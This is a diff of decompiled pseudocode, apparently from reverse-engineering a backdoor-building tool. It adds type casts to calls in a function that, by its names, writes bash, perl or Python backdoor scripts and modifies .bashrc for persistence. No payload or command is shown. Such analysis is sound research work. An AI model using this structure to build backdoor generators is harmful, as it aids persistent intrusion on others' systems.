@@ -50,7 +50,7 @@ __int64 __fastcall backdoorautomater::shellscript::create_script(
       v18 = *a1;
       v15 = v21;
       v14 = v20;
-      v10 = backdoorautomater::shellscript::write_shell_bash(&v22, &v18, &v14);
+      v10 = backdoorautomater::shellscript::write_shell_bash((__int64)&v22, (__int64)&v18, (__int64)&v14);
       goto LABEL_10;
     case 2u:
       v23 = *((_QWORD *)a2 + 2);
@@ -59,7 +59,7 @@ __int64 __fastcall backdoorautomater::shellscript::create_script(
       v18 = *a1;
       v15 = v21;
       v14 = v20;
-      v10 = backdoorautomater::shellscript::write_shell_perl(&v22, &v18, &v14);
+      v10 = backdoorautomater::shellscript::write_shell_perl((__int64)&v22, (__int64)&v18, (__int64)&v14);
       goto LABEL_10;
     case 1u:
       v23 = *((_QWORD *)a2 + 2);
@@ -68,7 +68,7 @@ __int64 __fastcall backdoorautomater::shellscript::create_script(
       v18 = *a1;
       v15 = v21;
       v14 = v20;
-      v10 = backdoorautomater::shellscript::write_shell_pyfile(&v22, &v18, &v14);
+      v10 = backdoorautomater::shellscript::write_shell_pyfile((__int64)&v22, (__int64)&v18, (__int64)&v14);
 LABEL_10:
       backdoorautomater::sanitizer::sanitize_return_fn(v10);
       v11 = 1;
@@ -78,7 +78,7 @@ LABEL_10:
 LABEL_12:
   v15 = v25;
   v14 = v24;
-  v12 = backdoorautomater::shellscript::modify_bashrc(&v14, a5);
+  v12 = backdoorautomater::shellscript::modify_bashrc((__int64)&v14, a5);
   backdoorautomater::sanitizer::sanitize_return_fn(v12);
   *(_QWORD *)&v14 = &off_22A7E8;
   *((_QWORD *)&v14 + 1) = 1LL;
